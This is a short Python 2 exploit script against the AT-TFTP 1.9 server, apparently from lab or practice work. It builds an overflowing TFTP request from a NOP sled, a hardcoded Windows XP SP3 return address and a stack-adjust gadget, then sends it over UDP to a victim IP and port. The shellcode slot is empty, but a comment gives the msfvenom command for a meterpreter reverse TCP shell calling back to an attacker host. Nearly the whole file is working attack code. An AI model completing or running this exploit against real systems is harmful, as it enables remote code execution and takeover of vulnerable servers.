#!/usr/bin/python

#AT-TFTP v1.9 Exploit
# python 2.7
import sys, socket

# to run 'python atftp_lfname.py <victim IP> <victim Port> <attacker IP>'

if len(sys.argv) < 4:
    print "python atftp_lfname.py <victim IP> <victim Port> <attacker IP>"
    sys.exit(-1)

host = sys.argv[1]
port = int(sys.argv[2])
lhost = sys.argv[3]
exploit = ""

ret = "\x53\x93\x42\x7e" # return address for XPSP3, little endian
nop = "\x90" * (25-len(lhost)) # calc NOP sled size

## need small payload (<210) but unlike writeup, not a meterpreter shell.  Let's do meterpreter first to validate
## that everything is working and then replace payload.  need to use msfvenom instead of msfpayload.

# create payload with "msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=192.168.1.2 LPORT=443 -f python -o payload.py"
# this gives us python3 code, so a little change.

payload = ""

exploit = "\x00\x02" + nop +payload + ret + "\x83\xc4\x28\xc3\x00netascii\x00"


## create socket and send

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.sendto(exploit, (host,port))




